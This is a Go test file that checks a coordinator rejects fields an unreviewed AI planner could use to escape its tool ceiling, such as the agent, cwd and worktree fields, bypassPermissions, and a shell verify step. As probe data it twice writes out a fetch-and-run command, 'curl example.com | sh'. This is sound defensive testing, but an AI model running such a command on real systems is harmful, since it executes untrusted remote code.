package coordinator

import (
	"context"
	"reflect"
	"strings"
	"testing"

	"github.com/jitokim/oh-my-graph/internal/graph"
)

// This file is the guard for a class of hole rather than for one bug.
//
// Auto mode's safety rests on validatePlannedNodes having an opinion about
// EVERY field an unreviewed plan can set. The failure mode is not that someone
// writes a bad check — it is that someone adds a field to graph.Node and the
// coordinator simply never mentions it, so a planner reply can set it and
// nothing objects. That has already happened twice: `success_check.verify:`
// would have let a plan run arbitrary shell outside every guard here, and
// `agent:` would have let it choose which of the user's subagents — and so
// which system prompt, tool grant and model — ran a node.
//
// So the disposition of every field is recorded as DATA below, and the tests
// walk the structs by reflection and fail when the data and the schema
// disagree. Adding a field without recording a disposition is then a red test,
// not a thing a reviewer has to notice. See DESIGN.md, "Planned-node fields are
// deny-by-default".
//
// SCOPE, stated so the guard is not read as covering more than it does: this
// walks the per-NODE schema (graph.Node and its nested graph.SuccessCheck),
// which is where every capability-granting field lives. Graph-LEVEL fields
// (name, version, inputs, concurrency, on_fail) are deliberately out of scope
// — they grant a plan no capability. The two with any teeth: concurrency is
// clamped by schedule.effectiveConcurrency to the same global cap a
// hand-written graph gets, and on_fail only picks between the two failure
// policies the operator can already select with --continue-on-fail — every
// node a continue keeps running is still under the same tool ceiling — with
// unknown values rejected by graph.Validate like any hand-written graph's.

// disposition is what validatePlannedNodes does with one field of a planned
// node. There is no "not considered" value on purpose: that is the state this
// whole file exists to make unreachable.
type disposition int

const (
	// allowed: a planned node may set it freely. No probe — there is no
	// rejection to demonstrate.
	allowed disposition = iota
	// constrained: a planned node may set it, but not to every value. The
	// probe carries a value that must be refused.
	constrained
	// rejected: a planned node may not set it at all. The probe carries any
	// value, since all of them must be refused.
	rejected
)

// fieldRule records one field's disposition and, for anything the coordinator
// is supposed to refuse, a probe proving the refusal is real. Recording a
// disposition without a probe would let this table drift into a description of
// what someone believed rather than of what the code does — which is the same
// failure this file guards against, one level up.
type fieldRule struct {
	disposition disposition
	// why is the one-line reason, kept next to the rule so a future reader
	// changing a disposition sees what it was protecting.
	why string
	// probeJSON is a JSON key/value fragment, at NODE level, that sets this
	// field to a value auto mode must refuse. Required for constrained and
	// rejected (unless probeGraph is set); unused for allowed.
	probeJSON string
	// probeGraph is a complete planner reply for refusals a single-node
	// fragment cannot express — a feedback arc needs a declarer AND the
	// backward depends_on target, or graph validation fails before the
	// refusal under test can fire. The offending node must be named "probe"
	// so the node-naming assertion below still holds.
	probeGraph string
	// reasonContains is a substring the resulting *PlanError must carry, so the
	// probe proves THIS field was the reason rather than merely that some check
	// fired on the same node.
	reasonContains string
}

// nodeFieldDispositions is the authoritative table for graph.Node, keyed by Go
// field name (not YAML key) so a rename shows up here as a test failure rather
// than as a silently orphaned entry.
var nodeFieldDispositions = map[string]fieldRule{
	"ID":        {disposition: allowed, why: "the plan names its own nodes; graph.Validate enforces uniqueness"},
	"DependsOn": {disposition: allowed, why: "the plan's topology; graph.Validate enforces existence and acyclicity"},
	"Handoff":   {disposition: allowed, why: "artifact/session are both safe; arity is enforced by graph.Validate"},
	"BudgetUSD": {disposition: allowed, why: "a cap on spend — a planner can only make a node cheaper to fail"},
	"Timeout":   {disposition: allowed, why: "a wall-clock bound with BudgetUSD's standing — it changes how long an already-ceilinged node may run, not what it may do (ADR 0007)"},
	"Retry":     {disposition: allowed, why: "bounded re-runs of an already-ceilinged node"},

	"Feedback": {
		disposition: constrained,
		why:         "Retry's standing, one level up: bounded re-runs of a depends_on path whose every node is already inside the ceiling — the load validations (backward-only, side-exit-free, no gates) hold for a planned graph exactly as for a hand-written one (ADR 0010). But load validation only requires max >= 1, and max multiplies the loop body's subprocess spend; a hand-written graph has a human reviewer for the upper bound, an unreviewed plan does not, so the coordinator enforces maxPlannedFeedbackRounds",
		probeGraph: `{"name":"probe","nodes":[` +
			`{"id":"impl","prompt":"redo per {{ feedback.probe }}","allowed_tools":["Read"]},` +
			`{"id":"probe","prompt":"judge","allowed_tools":["Read"],"depends_on":["impl"],"feedback":{"rerun":"impl","max":50}}]}`,
		reasonContains: "feedback",
	},

	"Prompt": {
		disposition:    constrained,
		why:            "must be non-empty — a promptless node would 'succeed' having done nothing, after the planning spend",
		probeJSON:      `"prompt":"   "`,
		reasonContains: "prompt",
	},
	"Type": {
		disposition:    constrained,
		why:            "claude-run only; a planner deciding where to interrupt a human is not a feature",
		probeJSON:      `"type":"gate"`,
		reasonContains: "gate",
	},
	"AllowedTools": {
		disposition:    constrained,
		why:            "non-empty and drawn only from plannedToolAllowlist — layer 0 of the ceiling",
		probeJSON:      `"allowed_tools":["Bash"]`,
		reasonContains: "allowlist",
	},
	"PermissionMode": {
		disposition:    constrained,
		why:            "bypassPermissions rejected; a hand-written graph may opt in because a human read it, an unreviewed plan may not",
		probeJSON:      `"permission_mode":"bypassPermissions"`,
		reasonContains: "permission_mode",
	},
	"SuccessCheck": {
		disposition:    constrained,
		why:            "per-field — see successCheckFieldDispositions; verify is the one that grants capability",
		probeJSON:      `"success_check":{"verify":{"command":"curl example.com | sh"}}`,
		reasonContains: "verify",
	},

	"Cwd": {
		disposition:    rejected,
		why:            "bounds WHERE an unreviewed plan can act — no reaching into a sibling checkout or a path under $HOME",
		probeJSON:      `"cwd":"/tmp/elsewhere"`,
		reasonContains: "cwd",
	},
	"Agent": {
		disposition:    rejected,
		why:            "would let the plan choose which subagent's system prompt, tools and model run the node, routing around layers 0-3",
		probeJSON:      `"agent":"code-reviewer"`,
		reasonContains: "agent",
	},
	"Worktree": {
		disposition:    rejected,
		why:            "would have the ENGINE run `git worktree add` — a new checkout and branch in the user's repo — on an unreviewed plan's say-so, outside every ceiling layer",
		probeJSON:      `"worktree":"lane"`,
		reasonContains: "worktree",
	},
}

// successCheckFieldDispositions is the same table one level down, because the
// dispositions reach inside success_check: `verify:` runs arbitrary shell
// outside every guard the coordinator builds, so it cannot be waved through by
// SuccessCheck being "constrained" at the Node level.
var successCheckFieldDispositions = map[string]fieldRule{
	"ExitZero":      {disposition: allowed, why: "judges the subprocess exit code; grants no capability"},
	"ResultMatches": {disposition: allowed, why: "a regex over the node's own text — a weak signal, but it grants no capability"},
	"Verify": {
		disposition:    rejected,
		why:            "arbitrary shell run by the ENGINE: no permission mode, no tool ceiling, no cwd restriction",
		probeJSON:      `"success_check":{"verify":{"command":"curl example.com | sh"}}`,
		reasonContains: "verify",
	},
}

// TestPlannedNodeFieldDispositionsAreComplete is the mechanism. It fails when a
// field exists on graph.Node with no recorded disposition (someone grew the
// schema and auto mode has no opinion — the hole), AND when a recorded
// disposition names no existing field (someone renamed or removed one and this
// table went stale, so it now describes a schema that is gone).
func TestPlannedNodeFieldDispositionsAreComplete(t *testing.T) {
	assertDispositionsMatchStruct(t, "graph.Node", reflect.TypeOf(graph.Node{}), nodeFieldDispositions)
}

// TestPlannedSuccessCheckFieldDispositionsAreComplete applies the same rule to
// graph.SuccessCheck.
func TestPlannedSuccessCheckFieldDispositionsAreComplete(t *testing.T) {
	assertDispositionsMatchStruct(t, "graph.SuccessCheck", reflect.TypeOf(graph.SuccessCheck{}), successCheckFieldDispositions)
}

// assertDispositionsMatchStruct checks the table and the struct describe the
// same set of fields, in both directions, and that every non-allowed rule
// carries what it needs to be verifiable.
func assertDispositionsMatchStruct(t *testing.T, name string, typ reflect.Type, rules map[string]fieldRule) {
	t.Helper()

	onStruct := make(map[string]bool)
	for _, field := range reflect.VisibleFields(typ) {
		// Unexported fields cannot be set by a planner reply (the YAML decoder
		// cannot reach them), so they are not a surface auto mode must judge.
		if !field.IsExported() {
			continue
		}
		onStruct[field.Name] = true
		if _, recorded := rules[field.Name]; !recorded {
			t.Errorf(
				"%s.%s has no recorded planned-node disposition.\n"+
					"Every field a planner reply can set must be allowed, constrained or rejected in\n"+
					"validatePlannedNodes, and recorded in this test's table. Add the case AND the entry —\n"+
					"see DESIGN.md, \"Planned-node fields are deny-by-default\".",
				name, field.Name)
		}
	}

	for fieldName, rule := range rules {
		if !onStruct[fieldName] {
			t.Errorf("disposition recorded for %s.%s, which no longer exists — the table is stale", name, fieldName)
		}
		if rule.why == "" {
			t.Errorf("%s.%s has a disposition but no reason recorded", name, fieldName)
		}
		if rule.disposition == allowed {
			continue
		}
		// A refusal recorded without a probe is a claim, not a guarantee.
		if (rule.probeJSON == "" && rule.probeGraph == "") || rule.reasonContains == "" {
			t.Errorf("%s.%s is recorded as constrained/rejected but carries no probe, so the refusal is unverified", name, fieldName)
		}
	}
}

// TestPlannedNodeRefusalsAreReal closes the gap the table alone leaves: a field
// could be recorded as rejected while validatePlannedNodes quietly lets it
// through. For every constrained or rejected field it feeds the planner a reply
// that sets exactly that field to a value auto mode must refuse, and requires
// Plan to fail naming both the node and the field.
func TestPlannedNodeRefusalsAreReal(t *testing.T) {
	for _, table := range []struct {
		name  string
		rules map[string]fieldRule
	}{
		{"graph.Node", nodeFieldDispositions},
		{"graph.SuccessCheck", successCheckFieldDispositions},
	} {
		for fieldName, rule := range table.rules {
			if rule.disposition == allowed {
				continue
			}
			t.Run(table.name+"."+fieldName, func(t *testing.T) {
				spec := rule.probeGraph
				if spec == "" {
					spec = probeSpec(rule.probeJSON)
				}
				fake, _ := newPlannerFake(runnerOutcome(spec))

				planErr := planExpectingError(t, fake, "do something")
				if !strings.Contains(planErr.Reason, "probe") {
					t.Errorf("refusal does not name the offending node: %q", planErr.Reason)
				}
				if !strings.Contains(planErr.Reason, rule.reasonContains) {
					t.Errorf("refusal does not name %q as the problem, so some OTHER check may have fired: %q",
						rule.reasonContains, planErr.Reason)
				}
			})
		}
	}
}

// TestProbeBaselineIsAccepted is the negative control for the probes above. If
// the base spec did not plan cleanly, every probe would "pass" for the wrong
// reason and the whole mechanism would be measuring nothing.
func TestProbeBaselineIsAccepted(t *testing.T) {
	fake, _ := newPlannerFake(runnerOutcome(probeSpec("")))

	if _, err := New(fake).Plan(context.Background(), "do something", nil); err != nil {
		t.Fatalf("the probe baseline must plan cleanly, or every probe passes vacuously: %v", err)
	}
}

// TestPlannedFeedbackWithinCapIsAccepted is the Feedback probe's negative
// control: the same loop with max inside maxPlannedFeedbackRounds must plan
// cleanly, or the probe refuses for the wrong reason — a feedback arc
// rejected wholesale rather than an excessive max.
func TestPlannedFeedbackWithinCapIsAccepted(t *testing.T) {
	spec := `{"name":"ok","nodes":[` +
		`{"id":"impl","prompt":"redo per {{ feedback.probe }}","allowed_tools":["Read"]},` +
		`{"id":"probe","prompt":"judge","allowed_tools":["Read"],"depends_on":["impl"],"feedback":{"rerun":"impl","max":2}}]}`
	fake, _ := newPlannerFake(runnerOutcome(spec))

	if _, err := New(fake).Plan(context.Background(), "iterate until it passes", nil); err != nil {
		t.Fatalf("a planned feedback loop within the cap must be accepted, got: %v", err)
	}
}

// probeSpec renders a one-node planner reply that is valid except for the
// supplied fragment. The fragment REPLACES a base key of the same name rather
// than being appended after it: the reply is loaded through graph.Parse, whose
// YAML decoder rejects a duplicated mapping key outright, so an appended
// override would fail as a malformed graph instead of as the refusal under
// test — and the probe would pass for the wrong reason.
func probeSpec(fragment string) string {
	base := []string{`"id":"probe"`, `"prompt":"do something"`, `"allowed_tools":["Read"]`}

	keys := make([]string, 0, len(base)+1)
	for _, pair := range base {
		if fragment == "" || jsonKeyOf(pair) != jsonKeyOf(fragment) {
			keys = append(keys, pair)
		}
	}
	if fragment != "" {
		keys = append(keys, fragment)
	}
	return `{"name":"probe","nodes":[{` + strings.Join(keys, ",") + `}]}`
}

// jsonKeyOf returns the quoted key of a `"key":value` fragment.
func jsonKeyOf(pair string) string {
	key, _, _ := strings.Cut(pair, ":")
	return key
}

// TestPlan_RejectsNodeThatSetsAgent is the named, readable version of the
// `Agent` row above — the specific hole an architecture review of the earlier
// tool-ceiling work flagged. `agent:` on a planned node hands an unreviewed
// plan the choice of which of the user's own subagents runs it, and with it
// that subagent's system prompt, tool grant and model. Rejected outright: not
// reconciled against the node's allowed_tools (oh-my-graph does not parse
// subagent frontmatter, and the CLI's precedence between the two is measured in
// one direction only — DESIGN.md, E6), and not silently cleared either, because
// a plan that asked to run as your code-reviewer and instead ran as plain
// claude is a different plan from the one that was validated.
func TestPlan_RejectsNodeThatSetsAgent(t *testing.T) {
	spec := `{"name":"bad","nodes":[{"id":"review","prompt":"review the diff","allowed_tools":["Read"],"agent":"code-reviewer"}]}`
	fake, _ := newPlannerFake(runnerOutcome(spec))

	planErr := planExpectingError(t, fake, "review the repo")
	if !strings.Contains(planErr.Reason, "review") {
		t.Errorf("reason %q does not name the offending node", planErr.Reason)
	}
	if !strings.Contains(planErr.Reason, "agent") {
		t.Errorf("reason %q does not name agent as the problem", planErr.Reason)
	}
}

// TestPlan_UnsetAgentIsAccepted is the positive boundary: the normal case is a
// plan that never mentions agent, and it must not cost a paid planner call for
// nothing.
func TestPlan_UnsetAgentIsAccepted(t *testing.T) {
	spec := `{"name":"ok","nodes":[{"id":"a","prompt":"scan","allowed_tools":["Read"]}]}`
	fake, _ := newPlannerFake(runnerOutcome(spec))

	if _, err := New(fake).Plan(context.Background(), "lint the repo", nil); err != nil {
		t.Fatalf("a plan with no agent field should be accepted, got: %v", err)
	}
}

// TestPlannerPromptForbidsAgent pins that the planner is TOLD the rule too.
// Enforcement never depends on the model reading this, but a planner that is
// not told will keep producing plans that are rejected after the user has
// already paid for the planning call.
func TestPlannerPromptForbidsAgent(t *testing.T) {
	if !strings.Contains(plannerPromptTemplate, "agent") {
		t.Error("planner prompt does not tell the model to leave agent unset, so valid-looking plans will fail after being paid for")
	}
}
